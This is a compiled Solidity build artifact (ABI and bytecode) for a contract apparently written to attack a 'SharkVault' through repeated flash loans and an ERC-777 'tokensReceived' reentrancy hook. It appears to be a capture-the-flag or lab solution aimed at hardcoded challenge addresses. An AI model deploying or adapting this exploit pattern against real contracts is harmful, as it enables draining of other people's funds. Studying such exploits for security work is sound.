{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"gold","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC20"}],"stateMutability":"view"},{"type":"function","name":"lender","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC3156FlashLender"}],"stateMutability":"view"},{"type":"function","name":"onFlashLoan","inputs":[{"name":"initiator","type":"address","internalType":"address"},{"name":"token","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"fee","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes32","internalType":"bytes32"}],"stateMutability":"nonpayable"},{"type":"function","name":"registry","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC1820Registry"}],"stateMutability":"view"},{"type":"function","name":"seagold","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC20"}],"stateMutability":"view"},{"type":"function","name":"sharkVault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract SharkVault"}],"stateMutability":"view"},{"type":"function","name":"tokensReceived","inputs":[{"name":"operator","type":"address","internalType":"address"},{"name":"from","type":"address","internalType":"address"},{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"userData","type":"bytes","internalType":"bytes"},{"name":"operatorData","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052600080546001600160a01b031990811673fcb668c2108782ac6b0916032bd2af5a1563e65d1790915560018054821673dd88c9b924824f0e21dafe866b11a24d393992d117905560048054909116731820a4b7618bde71dce8cdc73aab6c95905fad2417905534801561007657600080fd5b50600160009054906101000a90046001600160a01b03166001600160a01b031663fbec6f216040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100ca573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100ee9190610216565b600280546001600160a01b0319166001600160a01b03928316179055600154604080516314547f8f60e01b8152905191909216916314547f8f9160048083019260209291908290030181865afa15801561014c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101709190610216565b600380546001600160a01b0319166001600160a01b03928316179055600480546040516329965a1d60e01b8152309281018390527fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b60248201526044810192909252909116906329965a1d90606401600060405180830381600087803b1580156101f957600080fd5b505af115801561020d573d6000803e3d6000fd5b50505050610246565b60006020828403121561022857600080fd5b81516001600160a01b038116811461023f57600080fd5b9392505050565b6106fc806102556000396000f3fe608060405234801561001057600080fd5b50600436106100875760003560e01c80637b26ad791161005b5780637b26ad79146101055780639e5faafc14610118578063bcead63e14610120578063fbec6f211461013357600080fd5b806223de291461008c57806314547f8f146100a157806323e30c8b146100d15780637b103999146100f2575b600080fd5b61009f61009a36600461053a565b610146565b005b6003546100b4906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6100e46100df3660046105e5565b6101b6565b6040519081526020016100c8565b6004546100b4906001600160a01b031681565b6001546100b4906001600160a01b031681565b61009f61041d565b6000546100b4906001600160a01b031681565b6002546100b4906001600160a01b031681565b600154604051634c1af04960e11b81526815af1d78b58c40000060048201526001600160a01b0390911690639835e09290602401600060405180830381600087803b15801561019457600080fd5b505af11580156101a8573d6000803e3d6000fd5b505050505050505050505050565b6002546001546040516370a0823160e01b81523060048201526000926001600160a01b039081169263095ea7b39291169083906370a0823190602401602060405180830381865afa15801561020f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610233919061065d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561027e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102a29190610676565b5060015460405163465a700760e01b81526815af1d78b58c40000060048201526001600160a01b039091169063465a700790602401600060405180830381600087803b1580156102f157600080fd5b505af1158015610305573d6000803e3d6000fd5b505060015460405163317afabb60e21b8152681043561a882930000060048201526001600160a01b03909116925063c5ebeaec9150602401600060405180830381600087803b15801561035757600080fd5b505af115801561036b573d6000803e3d6000fd5b505060025460005460405163095ea7b360e01b81526001600160a01b0391821660048201526815af1d78b58c40000060248201529116925063095ea7b391506044016020604051808303816000875af11580156103cc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103f09190610676565b507f439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9979650505050505050565b60005b600a8110156104d25760008054600254604051632e7ff4ef60e11b81523060048201526001600160a01b0391821660248201526815af1d78b58c40000060448201526080606482015260848101939093521690635cffe9de9060a4016020604051808303816000875af115801561049b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104bf9190610676565b50806104ca8161069f565b915050610420565b50565b80356001600160a01b03811681146104ec57600080fd5b919050565b60008083601f84011261050357600080fd5b50813567ffffffffffffffff81111561051b57600080fd5b60208301915083602082850101111561053357600080fd5b9250929050565b60008060008060008060008060c0898b03121561055657600080fd5b61055f896104d5565b975061056d60208a016104d5565b965061057b60408a016104d5565b955060608901359450608089013567ffffffffffffffff8082111561059f57600080fd5b6105ab8c838d016104f1565b909650945060a08b01359150808211156105c457600080fd5b506105d18b828c016104f1565b999c989b5096995094979396929594505050565b60008060008060008060a087890312156105fe57600080fd5b610607876104d5565b9550610615602088016104d5565b94506040870135935060608701359250608087013567ffffffffffffffff81111561063f57600080fd5b61064b89828a016104f1565b979a9699509497509295939492505050565b60006020828403121561066f57600080fd5b5051919050565b60006020828403121561068857600080fd5b8151801515811461069857600080fd5b9392505050565b6000600182016106bf57634e487b7160e01b600052601160045260246000fd5b506001019056fea2646970667358221220df7121ee31b2bedbee116cb3271934a37c8a63f5f7c78ad5679d8f9e47aa3e7b64736f6c63430008130033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","gold()":"fbec6f21","lender()":"bcead63e","onFlashLoan(address,address,uint256,uint256,bytes)":"23e30c8b","registry()":"7b103999","seagold()":"14547f8f","sharkVault()":"7b26ad79","tokensReceived(address,address,address,uint256,bytes,bytes)":"0023de29"},"id":35}